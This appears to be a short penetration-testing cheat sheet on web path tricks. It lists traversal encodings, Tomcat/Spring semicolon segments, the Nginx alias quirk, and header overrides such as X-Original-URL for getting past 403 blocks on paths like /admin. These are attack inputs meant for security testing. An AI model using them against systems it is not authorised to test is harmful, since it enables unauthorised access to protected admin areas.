# Application entry points and path filters

## Path normalization
Compare each variant against the canonical path and a missing path.

| Clue | Try |
| --- | --- |
| Tomcat / Spring path filter | `..;/` or `/;/` segment |
| Nginx `alias` | `/x../` vs `/x/` (only if alias/location boundaries fit) |
| Filter strips `../` | `%2e%2e%2f`, `..%2f`, `....//`, double encoding, one at a time |
| Proxy trusts forwarded headers | `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL` on admin-only paths |

## 403 bypass on a specific path
Same idea as above, aimed at one blocked path instead of a filter. Try one at a time, compare against the baseline 403:

| Trick | Example |
| --- | --- |
| Trailing dot | `/admin/.` |
| Encoded dot segment | `/%2e/admin`, double-encoded `/%252e/admin` |
| Semicolon segment | `/;/admin`, `/admin/.;/` |
| Case change | `/Admin`, `/ADMIN` |
| Header override | `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` (same headers as the row above, aimed at one path instead of a filter) |

- These bypass a block applied by a *front* component (proxy, WAF) while the *backend* still serves the path. Confirm the response is the real admin content, not another 403/404 page styled differently.

## Known application entry points
Table moved to [cms-and-apps](cms-and-apps.md). This page covers path tricks; that one covers the apps (Tomcat, Jenkins, WordPress, Joomla/Drupal, exposed Git, WebDAV, Shellshock, known CVE patterns).
